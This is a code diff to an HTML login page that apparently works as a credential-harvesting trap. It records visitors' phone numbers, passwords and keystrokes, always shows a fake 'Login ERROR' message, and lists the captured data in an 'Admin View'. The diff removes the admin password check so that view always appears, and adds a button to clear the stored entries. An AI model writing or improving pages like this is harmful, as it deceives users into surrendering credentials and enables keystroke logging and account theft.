@@ -89,6 +89,7 @@
     <div class="login-title">Admin View</div>
     <h2>Logged In Users and Typed Data</h2>
     <ul id="userList"></ul>
+    <button onclick="deleteAll()">Delete All</button>
 </div>
 
 <script>
@@ -103,16 +104,10 @@
         users.push({ phone, password, keystrokesPhone: keystrokes.phone, keystrokesPassword: keystrokes.password });
 
         // Display login error message
-        document.getElementById("loginMessage").innerText = "Login ERROR";
-        document.getElementById("loginMessage").style.display = "block"; // Ensure message is visible
+        document.getElementById("loginMessage").innerText = "Login ERROR!";
 
-        // Show admin view if the password is 'admin123'
-        if (password === "admin123") {
-            displayAdminView(); // Show admin view
-        }
-
-        // Here you can add code to save user data to the database
-        // Example: saveToDatabase(phone, password, keystrokes);
+        // Always show the admin view
+        displayAdminView();
 
         // Optionally, reset the form fields
         document.getElementById("loginForm").reset();
@@ -137,11 +132,13 @@
         keystrokes[inputName] += event.data || '';
     }
 
-    function getKeystrokes() {
-        return `Phone: ${keystrokes.phone}, Password: ${keystrokes.password}`;
+    function deleteAll() {
+        users.length = 0; // Clear the user array
+        displayAdminView(); // Refresh the admin view
     }
 </script>
 
 </body>
 </html>
+
 
